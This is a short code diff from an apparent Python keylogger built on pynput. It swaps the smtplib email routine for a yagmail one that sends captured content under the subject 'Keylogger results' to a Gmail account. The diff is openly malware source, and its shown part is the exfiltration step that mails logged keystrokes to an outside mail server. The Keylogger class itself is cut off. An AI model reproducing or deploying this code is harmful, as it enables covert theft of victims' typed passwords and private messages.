@@ -2,15 +2,13 @@
 
 import pynput.keyboard as pynkey
 import threading
-import smtplib
+import yagmail
 
 
-def send_mail(email, password, message):
-    server = smtplib.SMTP("smtp.gmail.com", 587)
-    server.starttls()
-    server.login(email, password)
-    server.sendmail(email, email, message)
-    server.quit()
+def send_mail(email, password, content):
+    topic = "Keylogger results"
+    yag = yagmail.SMTP(email, password)
+    yag.send(email, topic, content)
 
 
 class Keylogger:
